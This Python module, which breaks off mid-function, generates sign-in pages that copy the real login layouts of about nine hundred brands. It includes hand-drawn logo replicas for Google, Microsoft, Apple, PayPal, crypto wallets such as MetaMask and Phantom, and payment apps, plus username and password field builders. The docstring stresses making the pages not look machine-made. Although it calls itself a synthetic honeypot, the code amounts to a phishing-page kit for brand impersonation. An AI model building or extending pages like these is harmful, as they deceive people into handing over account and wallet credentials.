"""Per-brand sign-in pages that follow the layout the brand actually uses.

Every page here is a reconstruction of a known layout, built from the brand's own
colours, mark and copy. Nothing is fetched from a live site and every field is
synthetic. A brand whose real page has a distinctive shape (Google's bare centred
card, Microsoft's split hero, Facebook's blue header, Instagram's phone frame, a
banking portal, an SSO pane) gets that shape; the rest get the archetype their
vertical uses, so a list of nine hundred pages does not read as machine-made.

A mark is a small inline SVG: a hand-built glyph for the brands people recognise,
and a wordmark in the brand colour for the long tail.
"""

# --------------------------------------------------------------- wordmarks ---


def wordmark(text, colour, *, weight=700, size=30, letter_spacing=-0.5, family="Arial"):
    """A wordmark SVG. Most brands are a name set in their own colour, which reads as
    the real page far more than a letter in a coloured square does."""
    width = max(60, int(len(text) * size * 0.62))
    # _esc() exists in this module for exactly this reason: a brand name reaches an SVG
    # attribute and an SVG text node, so a name carrying a quote broke out of both
    safe_text = _esc(text)
    return (
        f'<svg viewBox="0 0 {width} 40" width="{width}" height="40" role="img" '
        f'aria-label="{safe_text}"><text x="0" y="30" font-family="{family},Helvetica,'
        f'sans-serif" font-size="{size}" font-weight="{weight}" fill="{colour}" '
        f'letter-spacing="{letter_spacing}">{safe_text}</text></svg>'
    )


def monogram(initial, colour, *, size=52, radius=12, glyph="var(--brand)"):
    """A letter in a rounded tile, in the brand colour. The fallback for a brand with
    neither a glyph nor a wordmark of its own."""
    return (
        f'<svg viewBox="0 0 {size} {size}" width="{size}" height="{size}" role="img">'
        f'<rect width="{size}" height="{size}" rx="{radius}" fill="{colour}"/>'
        f'<text x="50%" y="54%" text-anchor="middle" dominant-baseline="middle" '
        f'font-family="Arial,Helvetica,sans-serif" font-size="{int(size * 0.5)}" '
        f'font-weight="700" fill="{glyph}">{initial}</text></svg>'
    )


# ------------------------------------------------------------- brand marks ---
# Hand-built glyphs for the brands a person recognises at a glance. Each one is a
# small, self-contained SVG so a page needs no network fetch to render.

G = "#4285F4"
MARK = {
    "google": (
        '<svg viewBox="0 0 48 48" width="48" height="48" role="img" aria-label="Google">'
        '<path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 '
        '2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/>'
        '<path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 '
        '1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 '
        '46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18C11.25 26.86 11 25.45 11 24s.25'
        '-2.86.69-4.18v-5.7H4.34C2.85 17.09 2 20.45 2 24s.85 6.91 2.34 9.88l7.35-5.7z"/>'
        '<path fill="#EA4335" d="M24 10.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 '
        '4.18 29.93 2 24 2 15.4 2 7.96 6.93 4.34 14.12l7.35 5.7c1.73-5.2 6.58-9.07 '
        '12.31-9.07z"/></svg>'
    ),
    "gmail": (
        '<svg viewBox="0 0 48 36" width="48" height="36" role="img" aria-label="Gmail">'
        '<path fill="#4285F4" d="M3.3 36h7.2V17.4L0 9.9v22.8C0 34.5 1.5 36 3.3 36z"/>'
        '<path fill="#34A853" d="M37.5 36h7.2c1.8 0 3.3-1.5 3.3-3.3V9.9l-10.5 7.5z"/>'
        '<path fill="#FBBC05" d="M37.5 3.3v14.1L48 9.9V5.1c0-4.1-4.7-6.4-8-4z"/>'
        '<path fill="#EA4335" d="M10.5 17.4V3.3L24 13.5 37.5 3.3v14.1L24 27.6z"/>'
        '<path fill="#C5221F" d="M0 5.1v4.8l10.5 7.5V3.3L8 1.1C4.7-1.3 0 1 0 5.1z"/>'
        "</svg>"
    ),
    "microsoft": (
        '<svg viewBox="0 0 23 23" width="22" height="22" role="img" aria-label="Microsoft">'
        '<rect width="10" height="10" fill="#f25022"/><rect x="12" width="10" height="10" '
        'fill="#7fba00"/><rect y="12" width="10" height="10" fill="#00a4ef"/>'
        '<rect x="12" y="12" width="10" height="10" fill="#ffb900"/></svg>'
    ),
    "office": (
        '<svg viewBox="0 0 24 24" width="26" height="26" role="img" aria-label="Office 365">'
        '<path fill="#eb3c00" d="M4 5.3l9-3.3 7 2.7v14.6l-7 2.7-9-3.3 7 1.9V6.9z"/>'
        '<path fill="#c22d00" d="M20 4.7v14.6l-7 2.7V4.7z"/></svg>'
    ),
    "outlook": (
        '<svg viewBox="0 0 24 24" width="26" height="26" role="img" aria-label="Outlook">'
        '<rect x="8" y="4" width="14" height="16" rx="1.5" fill="#0364b8"/>'
        '<rect x="8" y="4" width="14" height="4" fill="#0f6cbd"/>'
        '<circle cx="6" cy="12" r="6" fill="#0078d4"/>'
        '<text x="6" y="15.5" text-anchor="middle" font-family="Arial" font-size="7" '
        'font-weight="700" fill="#fff">O</text></svg>'
    ),
    "facebook": (
        '<svg viewBox="0 0 36 36" width="36" height="36" role="img" aria-label="Facebook">'
        '<circle cx="18" cy="18" r="18" fill="#1877f2"/><path fill="#fff" d="M25 23l.8-5h'
        '-4.8v-3.2c0-1.4.7-2.8 2.9-2.8h2.2V7.6s-2-.3-3.9-.3c-3.9 0-6.4 2.4-6.4 6.6V18H11v5'
        'h4.8v12h5.9V23H25z"/></svg>'
    ),
    "instagram": (
        '<svg viewBox="0 0 48 48" width="44" height="44" role="img" aria-label="Instagram">'
        '<defs><radialGradient id="ig" cx="30%" cy="107%" r="150%">'
        '<stop offset="0" stop-color="#fdf497"/><stop offset="5%" stop-color="#fdf497"/>'
        '<stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/>'
        '<stop offset="90%" stop-color="#285AEB"/></radialGradient></defs>'
        '<rect width="48" height="48" rx="12" fill="url(#ig)"/>'
        '<rect x="12" y="12" width="24" height="24" rx="7" fill="none" stroke="#fff" '
        'stroke-width="2.6"/><circle cx="24" cy="24" r="5.6" fill="none" stroke="#fff" '
        'stroke-width="2.6"/><circle cx="32.2" cy="15.8" r="1.7" fill="#fff"/></svg>'
    ),
    "whatsapp": (
        '<svg viewBox="0 0 24 24" width="34" height="34" role="img" aria-label="WhatsApp">'
        '<circle cx="12" cy="12" r="12" fill="#25d366"/><path fill="#fff" d="M17.5 14.4c'
        '-.3-.15-1.8-.9-2.1-1-.3-.1-.5-.15-.7.15-.2.3-.8 1-.95 1.2-.15.2-.35.2-.65.05-.3'
        '-.15-1.25-.45-2.4-1.5-.9-.8-1.5-1.75-1.65-2.05-.15-.3-.02-.45.13-.6.13-.13.3-.35'
        '.45-.5.15-.15.2-.3.3-.5.1-.2.05-.35-.02-.5-.08-.15-.7-1.7-.95-2.3-.25-.6-.5-.5'
        '-.7-.5h-.6c-.2 0-.5.07-.75.35-.25.3-.95.93-.95 2.27 0 1.34.97 2.63 1.1 2.8.13.18'
        '1.9 2.9 4.6 4.06.64.28 1.14.44 1.53.57.64.2 1.22.17 1.68.1.5-.07 1.53-.63 1.75'
        '-1.23.22-.6.22-1.12.15-1.23-.07-.1-.27-.17-.57-.32z"/></svg>'
    ),
    "apple": (
        '<svg viewBox="0 0 170 170" width="36" height="36" role="img" aria-label="Apple">'
        '<path fill="#000" d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53'
        '-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32'
        '-3.18-5.2-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 '
        '3.24-12.74 3.35-4.93.21-9.84-1.96-14.75-6.52-3.13-2.73-7.04-7.42-11.73-14.06'
        '-5.04-7.1-9.18-15.33-12.43-24.72-3.49-10.14-5.24-19.96-5.24-29.47 0-10.89 2.35'
        '-20.29 7.06-28.17 3.7-6.33 8.63-11.32 14.8-14.99 6.17-3.66 12.84-5.53 20.03'
        '-5.65 3.91 0 9.05 1.21 15.44 3.59 6.37 2.39 10.46 3.6 12.26 3.6 1.34 0 5.89'
        '-1.42 13.61-4.25 7.3-2.62 13.46-3.71 18.5-3.28 13.67 1.1 23.94 6.49 30.78 '
        '16.19-12.23 7.41-18.28 17.79-18.16 31.1.11 10.37 3.87 19 11.27 25.86 3.35 3.18 '
        '7.09 5.64 11.25 7.39-.9 2.62-1.85 5.13-2.86 7.54zM119.11 7.24c0 8.13-2.97 15.72'
        '-8.9 22.75-7.15 8.36-15.8 13.19-25.18 12.44a25.3 25.3 0 0 1-.19-3.08c0-7.8 3.4'
        '-16.15 9.43-22.98 3.01-3.46 6.84-6.34 11.49-8.63 4.64-2.25 9.03-3.5 13.16-3.72.'
        '12 1.08.19 2.16.19 3.22z"/></svg>'
    ),
    "icloud": (
        '<svg viewBox="0 0 48 48" width="42" height="42" role="img" aria-label="iCloud">'
        '<path fill="#3693f3" d="M38.6 21.6a10 10 0 0 0-9.3-7.4 11.6 11.6 0 0 0-21.4 '
        '4.2A8.6 8.6 0 0 0 10 35h26a7.6 7.6 0 0 0 2.6-13.4z"/></svg>'
    ),
    "linkedin": (
        '<svg viewBox="0 0 48 48" width="42" height="42" role="img" aria-label="LinkedIn">'
        '<rect width="48" height="48" rx="6" fill="#0a66c2"/><path fill="#fff" d="M15.2 19'
        'h4.4v14.5h-4.4zM17.4 13.4a2.6 2.6 0 1 1 0 5.2 2.6 2.6 0 0 1 0-5.2zM22.6 19h4.2v2'
        'h.06c.6-1.1 2-2.3 4.2-2.3 4.5 0 5.3 2.9 5.3 6.7v8.1h-4.4v-7.2c0-1.7 0-3.9-2.4'
        '-3.9s-2.8 1.9-2.8 3.8v7.3h-4.4z"/></svg>'
    ),
    "x": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="X">'
        '<path fill="#000" d="M18.9 2H22l-7.1 8.1L23.2 22h-6.6l-5.2-6.8L5.5 22H2.4l7.6'
        '-8.7L1.6 2h6.8l4.7 6.2zm-1.1 18h1.7L7.3 3.7H5.5z"/></svg>'
    ),
    "github": (
        '<svg viewBox="0 0 16 16" width="36" height="36" role="img" aria-label="GitHub">'
        '<path fill="#181717" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55'
        '-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82'
        '-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07'
        '-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36'
        '-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 '
        '2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75'
        '-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 '
        '8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg>'
    ),
    "amazon": (
        '<svg viewBox="0 0 120 40" width="104" height="35" role="img" aria-label="Amazon">'
        '<text x="0" y="23" font-family="Arial,Helvetica,sans-serif" font-size="25" '
        'font-weight="700" fill="#221f1f" letter-spacing="-1">amazon</text>'
        '<path d="M4 30c14 7 44 7 58-1" fill="none" stroke="#ff9900" stroke-width="3.4" '
        'stroke-linecap="round"/><path d="M62 29l7-2-3.5 6z" fill="#ff9900"/></svg>'
    ),
    "netflix": (
        '<svg viewBox="0 0 120 34" width="112" height="32" role="img" aria-label="Netflix">'
        '<text x="0" y="27" font-family="Arial Black,Arial,sans-serif" font-size="27" '
        'font-weight="900" fill="#e50914" letter-spacing="-1.5">NETFLIX</text></svg>'
    ),
    "spotify": (
        '<svg viewBox="0 0 24 24" width="34" height="34" role="img" aria-label="Spotify">'
        '<circle cx="12" cy="12" r="12" fill="#1db954"/><path fill="#fff" d="M6.6 9.8c3.6'
        '-1.1 7.6-.6 10.6 1.3M7.4 12.9c2.9-.9 6.1-.5 8.5 1M8.2 15.9c2.3-.7 4.8-.4 6.7.8" '
        'fill="none" stroke="#fff" stroke-width="1.7" stroke-linecap="round"/></svg>'
    ),
    "paypal": (
        '<svg viewBox="0 0 24 28" width="28" height="32" role="img" aria-label="PayPal">'
        '<path fill="#003087" d="M7.1 21.3H4.3L2.6 3.4c-.05-.35.2-.65.55-.65h6.6c3.9 0 6.4'
        ' 2.2 5.9 6.2-.55 4.4-3.6 6.3-7.3 6.3H6.3z"/><path fill="#009cde" d="M9.9 25.3H7.1'
        'l-.9-8.4h3.9c3.7 0 6.75-1.9 7.3-6.3.5-4-2-6.2-5.9-6.2h1.9c4.3 0 7 2.6 6.4 7.1'
        '-.6 4.8-4.1 6.9-8.2 6.9H10z"/></svg>'
    ),
    "stripe": (
        '<svg viewBox="0 0 60 26" width="58" height="25" role="img" aria-label="Stripe">'
        '<text x="0" y="20" font-family="Arial,Helvetica,sans-serif" font-size="21" '
        'font-weight="700" fill="#635bff" letter-spacing="-0.8">stripe</text></svg>'
    ),
    "slack": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Slack">'
        '<path fill="#36c5f0" d="M9.4 2.6a2.4 2.4 0 1 1 0 4.8H7V5a2.4 2.4 0 0 1 2.4-2.4z"/>'
        '<path fill="#2eb67d" d="M21.4 9.4a2.4 2.4 0 1 1-4.8 0V7H19a2.4 2.4 0 0 1 2.4 2.4z"/>'
        '<path fill="#ecb22e" d="M14.6 21.4a2.4 2.4 0 1 1 0-4.8H17V19a2.4 2.4 0 0 1-2.4 '
        '2.4z"/><path fill="#e01e5a" d="M2.6 14.6a2.4 2.4 0 1 1 4.8 0V17H5a2.4 2.4 0 0 1'
        '-2.4-2.4z"/><path fill="#36c5f0" d="M12.6 7.4h3.4v3.4h-3.4z" opacity=".85"/>'
        '<path fill="#e01e5a" d="M8 12.6h3.4V16H8z" opacity=".85"/></svg>'
    ),
    "dropbox": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Dropbox">'
        '<path fill="#0061ff" d="M6 2l6 3.9-6 3.9L0 5.9zM18 2l6 3.9-6 3.9-6-3.9zM0 13.7'
        'l6-3.9 6 3.9-6 3.9zM18 9.8l6 3.9-6 3.9-6-3.9zM6 18.4l6-3.9 6 3.9-6 3.9z"/></svg>'
    ),
    "zoom": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Zoom">'
        '<rect width="24" height="24" rx="5" fill="#2d8cff"/><path fill="#fff" d="M5 9.2c0'
        '-.6.5-1.1 1.1-1.1h7.2c.6 0 1.1.5 1.1 1.1v5.6c0 .6-.5 1.1-1.1 1.1H6.1c-.6 0-1.1'
        '-.5-1.1-1.1zm10.6 1.5l3.4-2.2v7l-3.4-2.2z"/></svg>'
    ),
    "adobe": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Adobe">'
        '<path fill="#fa0f00" d="M14.6 2H24v20zM9.4 2H0v20zM12 9.4L17.2 22h-3.4l-1.5-3.9H'
        '8.9z"/></svg>'
    ),
    "salesforce": (
        '<svg viewBox="0 0 48 34" width="44" height="31" role="img" aria-label="Salesforce">'
        '<path fill="#00a1e0" d="M19.6 6.6a7.4 7.4 0 0 1 12.2 2.3 8.6 8.6 0 0 1 12 7.9 8.7 '
        '8.7 0 0 1-8.7 8.7H10.7A8.9 8.9 0 0 1 1.8 16a8.9 8.9 0 0 1 8.4-8.9 7.4 7.4 0 0 1 '
        '9.4-.5z"/></svg>'
    ),
    "telegram": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Telegram">'
        '<circle cx="12" cy="12" r="12" fill="#229ed9"/><path fill="#fff" d="M5.4 11.8l11'
        '-4.3c.5-.2 1 .1.8.7l-1.9 8.9c-.1.6-.5.7-1 .4l-2.8-2-1.3 1.3c-.2.2-.4.4-.7.4l.2'
        '-3 5.6-5c.2-.2 0-.3-.3-.1l-6.9 4.3-2.9-.9c-.6-.2-.6-.6.2-.7z"/></svg>'
    ),
    "discord": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Discord">'
        '<path fill="#5865f2" d="M20.3 4.4A19 19 0 0 0 15.6 3l-.3.5a17 17 0 0 1 4.1 2.1 16 '
        '16 0 0 0-12.8 0A17 17 0 0 1 10.7 3.5L10.4 3a19 19 0 0 0-4.7 1.4C2.6 9.3 1.9 14 '
        '2.3 18.6A19 19 0 0 0 8 21l.7-1.1a12 12 0 0 1-1.9-.9l.5-.4a13.5 13.5 0 0 0 11.4 '
        '0l.5.4a12 12 0 0 1-1.9.9l.7 1.1a19 19 0 0 0 5.7-2.4c.5-5.3-.6-10-2.4-14.2zM9.1 '
        '15.3c-1 0-1.9-.9-1.9-2s.8-2 1.9-2 1.9.9 1.9 2-.8 2-1.9 2zm5.8 0c-1 0-1.9-.9-1.9'
        '-2s.8-2 1.9-2 1.9.9 1.9 2-.8 2-1.9 2z"/></svg>'
    ),
    "twitch": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Twitch">'
        '<path fill="#9146ff" d="M4 2L2.5 6v14h5v3h3l3-3h4l5-5V2zm16 11.5l-3 3h-5l-3 3v-3H5'
        'V4h15zM11 7h2v6h-2zm5 0h2v6h-2z"/></svg>'
    ),
    "reddit": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Reddit">'
        '<circle cx="12" cy="12" r="12" fill="#ff4500"/><circle cx="12" cy="13.5" r="6.4" '
        'fill="#fff"/><circle cx="9.6" cy="13.2" r="1.2" fill="#ff4500"/>'
        '<circle cx="14.4" cy="13.2" r="1.2" fill="#ff4500"/>'
        '<path d="M9.2 16c1.7 1.1 3.9 1.1 5.6 0" fill="none" stroke="#ff4500" '
        'stroke-width="1.1" stroke-linecap="round"/><circle cx="16.6" cy="7.4" r="1.6" '
        'fill="#fff"/></svg>'
    ),
    "snapchat": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Snapchat">'
        '<path fill="#fffc00" d="M12 1.8c3.2 0 5.4 2.5 5.4 5.6 0 .8-.1 1.6-.2 2.2.5.2 '
        '1.1.4 1.5.4.6 0 1 .4 1 1s-.5.9-1.2 1.1c-.5.2-1.3.4-1.5.8-.1.4.4 1.4 1.2 2.3.9 '
        '1 2 1.7 2.5 1.7.3 0 .5.2.5.5 0 .6-1.2 1-2.3 1.2-.4.1-.6.4-.7.9-.1.5-.3.9-.7.9'
        '-.5 0-1-.3-1.7-.3-.9 0-1.6.7-2.6 1.3-.6.4-1.2.6-1.9.6s-1.3-.2-1.9-.6c-1-.6-1.7'
        '-1.3-2.6-1.3-.7 0-1.2.3-1.7.3-.4 0-.6-.4-.7-.9-.1-.5-.3-.8-.7-.9-1.1-.2-2.3-.6'
        '-2.3-1.2 0-.3.2-.5.5-.5.5 0 1.6-.7 2.5-1.7.8-.9 1.3-1.9 1.2-2.3-.2-.4-1-.6-1.5'
        '-.8-.7-.2-1.2-.5-1.2-1.1s.4-1 1-1c.4 0 1-.2 1.5-.4-.1-.6-.2-1.4-.2-2.2 0-3.1 '
        '2.2-5.6 5.4-5.6z"/></svg>'
    ),
    "tiktok": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="TikTok">'
        '<path fill="#000" d="M16.5 2h-3v13.2a2.6 2.6 0 1 1-2.2-2.6v-3a5.6 5.6 0 1 0 5.2 '
        '5.6V8.7a6.6 6.6 0 0 0 3.5 1V6.6a3.6 3.6 0 0 1-3.5-3.5z"/></svg>'
    ),
    "binance": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Binance">'
        '<path fill="#f0b90b" d="M12 0l3.4 3.4L12 6.8 8.6 3.4zM6.8 5.2l3.4 3.4-3.4 3.4'
        '-3.4-3.4zM17.2 5.2l3.4 3.4-3.4 3.4-3.4-3.4zM12 10.4l3.4 3.4L12 17.2l-3.4-3.4zM'
        '6.8 16.2l3.4 3.4-3.4 3.4-3.4-3.4zM17.2 16.2l3.4 3.4-3.4 3.4-3.4-3.4z"/></svg>'
    ),
    "coinbase": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Coinbase">'
        '<circle cx="12" cy="12" r="12" fill="#0052ff"/><rect x="8.2" y="8.2" width="7.6" '
        'height="7.6" rx="1.6" fill="#fff"/></svg>'
    ),
    "metamask": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="MetaMask">'
        '<path fill="#e2761b" d="M21.5 3l-8 6 1.5-3.5zM2.5 3l8 6-1.4-3.5zM18.6 16.4l-2.1 '
        '3.2 4.6 1.3 1.3-4.5zM1.6 16.4L2.9 21l4.6-1.3-2.1-3.2z"/>'
        '<path fill="#e4761b" d="M7.2 10.6l-1.4 2.1 4.9.2-.2-5.3zM16.8 10.6l-3.4-3.1-.1 '
        '5.4 4.9-.2zM7.5 19.6l2.9-1.4-2.5-2zM13.6 18.2l2.9 1.4-.4-3.4z"/>'
        '<path fill="#763d16" d="M16.5 19.6l-2.9-1.4.2 1.9v1.3zM7.5 19.6l2.7 1.8v-1.3l.2'
        '-1.9z"/></svg>'
    ),
    "phantom": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Phantom">'
        '<path fill="#ab9ff2" d="M12 1.5A10.5 10.5 0 0 0 2.9 17.6c.4-1.5 2-4.6 4.3-4.6 '
        '2.7 0 2.3 4.4 4.9 4.4 2.5 0 2.4-4.4 5-4.4 1.4 0 2.6 1 3.4 2.1A10.5 10.5 0 0 0 '
        '12 1.5z"/><circle cx="8.4" cy="9.6" r="1.3" fill="#fff"/>'
        '<circle cx="14.6" cy="9.6" r="1.3" fill="#fff"/></svg>'
    ),
    "steam": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Steam">'
        '<circle cx="12" cy="12" r="12" fill="#171a21"/><circle cx="12" cy="12" r="5.6" '
        'fill="none" stroke="#c7d5e0" stroke-width="1.6"/><circle cx="12" cy="8.6" r="1.9" '
        'fill="#c7d5e0"/><path d="M3.4 15.4l4.2 1.7" stroke="#c7d5e0" stroke-width="1.6"/>'
        "</svg>"
    ),
    "playstation": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="PlayStation">'
        '<path fill="#0070d1" d="M9.4 15.6V4.9c0-.9.5-1.6 1.3-1.9.9-.3 1.8.2 2.1 1.1l2.4 '
        '8.4c.4 1.4.1 2.4-.9 2.9-1 .5-2.3.4-3.6-.1zm-6 2.6c-.9-.2-1.4-.6-1.3-1 .1-.5.8'
        '-.7 1.7-.5l3.6 1.1v1.9zM17 12.6c1.9.6 3.5 1.5 3.6 2.9.1 1.5-1.2 2.4-3.4 2.4-1.4 '
        '0-2.8-.3-3.9-.7v-2c1 .5 2.3.8 3.2.7 1-.1 1.4-.5 1.3-1-.1-.6-.9-1-2-1.5-.5-.2'
        '-.7-.5-.5-.8.2-.3.7-.3 1.7 0z"/></svg>'
    ),
    "xbox": (
        '<svg viewBox="0 0 24 24" width="32" height="32" role="img" aria-label="Xbox">'
        '<circle cx="12" cy="12" r="12" fill="#107c10"/><path fill="#fff" d="M6.6 5.2c2 '
        '2.3 4 4.9 5.4 7.3 1.4-2.4 3.4-5 5.4-7.3a9.9 9.9 0 0 0-10.8 0zM4.9 6.6A9.9 9.9 0 '
        '0 0 12 21.9c2.8 0 5.3-1.1 7.1-3-1.4-2.5-3.9-5.3-7.1-9.1-3.2 3.8-5.7 6.6-7.1 9.1z"'
        '"/></svg>'
    ),
    "airbnb": (
        '<svg viewBox="0 0 24 24" width="30" height="30" role="img" aria-label="Airbnb">'
        '<path fill="#ff5a5f" d="M12 2.4c1.2 0 2.2.6 2.8 1.6.9 1.6 4.3 7.7 5.2 9.9.9 2.2'
        '-.4 4.5-2.6 5.1-1.7.5-3.5-.2-4.6-1.6-.3-.4-.6-.8-.8-1.2-.2.4-.5.8-.8 1.2-1.1 1.4'
        '-2.9 2.1-4.6 1.6-2.2-.6-3.5-2.9-2.6-5.1.9-2.2 4.3-8.3 5.2-9.9.6-1 1.6-1.6 2.8'
        '-1.6zm0 2.2c-.5 0-.9.3-1.2.7-.9 1.5-4.2 7.5-5 9.6-.5 1.3.2 2.6 1.5 2.9 1 .3 2'
        '-.1 2.7-1 .6-.8 1.4-2.2 2-3.3.6 1.1 1.4 2.5 2 3.3.7.9 1.7 1.3 2.7 1 1.3-.3 2'
        '-1.6 1.5-2.9-.8-2.1-4.1-8.1-5-9.6-.3-.4-.7-.7-1.2-.7z"/></svg>'
    ),
    "uber": (
        '<svg viewBox="0 0 80 24" width="76" height="23" role="img" aria-label="Uber">'
        '<text x="0" y="19" font-family="Arial,Helvetica,sans-serif" font-size="20" '
        'font-weight="500" fill="#000" letter-spacing="0.5">Uber</text></svg>'
    ),
    "flipkart": (
        '<svg viewBox="0 0 120 32" width="112" height="30" role="img" aria-label="Flipkart">'
        '<text x="0" y="24" font-family="Arial,Helvetica,sans-serif" font-size="23" '
        'font-style="italic" font-weight="700" fill="#2874f0">Flipkart</text>'
        '<path d="M2 29h60" stroke="#ffe11b" stroke-width="2.6"/></svg>'
    ),
    "paytm": (
        '<svg viewBox="0 0 110 30" width="104" height="28" role="img" aria-label="Paytm">'
        '<text x="0" y="22" font-family="Arial,Helvetica,sans-serif" font-size="22" '
        'font-weight="700" fill="#002970">Pay</text>'
        '<text x="48" y="22" font-family="Arial,Helvetica,sans-serif" font-size="22" '
        'font-weight="700" fill="#00baf2">tm</text></svg>'
    ),
    "phonepe": (
        '<svg viewBox="0 0 120 30" width="112" height="28" role="img" aria-label="PhonePe">'
        '<text x="0" y="22" font-family="Arial,Helvetica,sans-serif" font-size="21" '
        'font-weight="700" fill="#5f259f">Phone</text>'
        '<text x="70" y="22" font-family="Arial,Helvetica,sans-serif" font-size="21" '
        'font-weight="700" fill="#5f259f">Pe</text></svg>'
    ),
    "zomato": (
        '<svg viewBox="0 0 110 28" width="104" height="26" role="img" aria-label="Zomato">'
        '<text x="0" y="21" font-family="Arial,Helvetica,sans-serif" font-size="21" '
        'font-weight="700" fill="#e23744" letter-spacing="-0.5">zomato</text></svg>'
    ),
    "swiggy": (
        '<svg viewBox="0 0 100 28" width="94" height="26" role="img" aria-label="Swiggy">'
        '<text x="0" y="21" font-family="Arial,Helvetica,sans-serif" font-size="21" '
        'font-weight="700" fill="#fc8019">Swiggy</text></svg>'
    ),
    "cred": (
        '<svg viewBox="0 0 80 28" width="76" height="26" role="img" aria-label="CRED">'
        '<text x="0" y="21" font-family="Georgia,serif" font-size="21" font-weight="700" '
        'fill="#000" letter-spacing="3">CRED</text></svg>'
    ),
}


def brand_mark(slug, name, brand):
    """The mark for a brand: a hand-built glyph, else a wordmark, else a monogram."""
    if slug in MARK:
        return MARK[slug]
    if len(name) <= 22:
        return wordmark(name, brand)
    return monogram(name[0].upper(), brand)


# ------------------------------------------------------------- shared parts ---


def _esc(text):
    """Attribute-safe text. A brand name never carries a quote, but a page that
    interpolates one must not break its own markup."""
    return (str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
            .replace('"', "&quot;"))


def _head(name, title, brand, favicon, extra=""):
    return (
        "<!doctype html>\n<html lang=\"en\">\n<head>\n"
        "<meta charset=\"utf-8\">\n"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">\n"
        "<meta name=\"robots\" content=\"noindex,nofollow\">\n"
        f"<title>{_esc(title)}</title>\n"
        f"<meta name=\"theme-color\" content=\"{brand}\">\n"
        "<meta name=\"referrer\" content=\"strict-origin-when-cross-origin\">\n"
        f"<link rel=\"icon\" href=\"{favicon}\">\n"
        f"<link rel=\"apple-touch-icon\" href=\"{favicon}\">\n"
        f"<meta property=\"og:title\" content=\"{_esc(title)}\">\n"
        f"<meta property=\"og:site_name\" content=\"{_esc(name)}\">\n"
        f"{extra}"
    )


def _trailer(slug, foot=""):
    """The hidden fields, the honeypot and the timing beacon every page carries."""
    return (
        '\n  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" '
        'autocomplete="off">\n'
        f'  <input type="hidden" name="_tpl" value="{_esc(slug)}">\n'
        '  <input type="hidden" name="_ts" value="__TS__">\n'
        f'{foot}'
        '\n<script>\n'
        "/* honeypot + human-timing beacon: if a bot autofills the hidden field we still\n"
        "   record it, and we log how long the form was open (bot forms are instant). */\n"
        "(function(){\n"
        "  var t0 = Date.now();\n"
        "  var f = document.querySelector('form');\n"
        "  if(!f) return;\n"
        "  f.addEventListener('submit', function(){\n"
        "    var el = f.querySelector('input[name=_ts]');\n"
        "    if(el) el.value = String(Date.now() - t0);\n"
        "  });\n"
        "})();\n"
        "</script>\n"
    )


def _field(label, fname, ftype, placeholder, *, style="boxed", autofocus=False):
    """One identifier field. `style` follows the archetype: a boxed input, an
    underline-only input (Microsoft), or a floating-label input (Google)."""
    af = " autofocus" if autofocus else ""
    ac = "username" if ftype != "password" else "current-password"
    if style == "underline":
        return (
            f'    <div class="field">\n'
            f'      <label for="{fname}">{_esc(label)}</label>\n'
            f'      <input id="{fname}" name="{fname}" type="{ftype}" '
            f'placeholder="{_esc(placeholder)}" autocomplete="{ac}" required{af}>\n'
            f"    </div>\n"
        )
    if style == "floating":
        return (
            f'    <div class="field float">\n'
            f'      <input id="{fname}" name="{fname}" type="{ftype}" '
            f'placeholder="{_esc(placeholder)}" autocomplete="{ac}" required{af}>\n'
            f'      <label for="{fname}">{_esc(label)}</label>\n'
            f"    </div>\n"
        )
    return (
        f'    <div class="field">\n'
        f'      <label for="{fname}">{_esc(label)}</label>\n'
